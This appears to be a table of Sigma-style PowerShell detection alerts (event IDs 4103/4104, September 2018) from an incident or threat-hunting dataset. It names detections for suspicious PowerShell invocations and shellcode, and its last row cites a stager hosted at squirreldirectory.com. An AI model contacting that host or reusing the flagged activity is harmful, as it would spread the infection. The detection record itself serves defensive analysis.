| 8f7cba50-023226 | high | 4103 | 2018-09-07T04:23:57Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023228 | high | 4103 | 2018-09-07T04:23:58Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023229 | high | 4103 | 2018-09-07T04:23:58Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023230 | high | 4103 | 2018-09-07T04:23:58Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023234 | high | 4104 | 2018-09-07T04:23:58Z | PowerShell ShellCode |
| 8f7cba50-023236 | high | 4103 | 2018-09-07T04:23:58Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023237 | high | 4103 | 2018-09-07T04:23:59Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023238 | high | 4103 | 2018-09-07T04:23:59Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023243 | high | 4104 | 2018-09-07T04:24:06Z | PowerShell ShellCode |
| 8f7cba50-023250 | high | 4104 | 2018-09-07T04:24:55Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-023252 | high | 4103 | 2018-09-07T04:24:55Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023254 | high | 4103 | 2018-09-07T04:24:55Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023255 | high | 4103 | 2018-09-07T04:24:55Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023256 | high | 4103 | 2018-09-07T04:24:55Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023260 | high | 4104 | 2018-09-07T04:24:55Z | PowerShell ShellCode |
| 8f7cba50-023262 | high | 4103 | 2018-09-07T04:24:55Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023263 | high | 4103 | 2018-09-07T04:24:55Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023264 | high | 4103 | 2018-09-07T04:24:55Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023269 | high | 4104 | 2018-09-07T04:24:57Z | **PowerShell ShellCode** (squirreldirectory.com/a stager) |
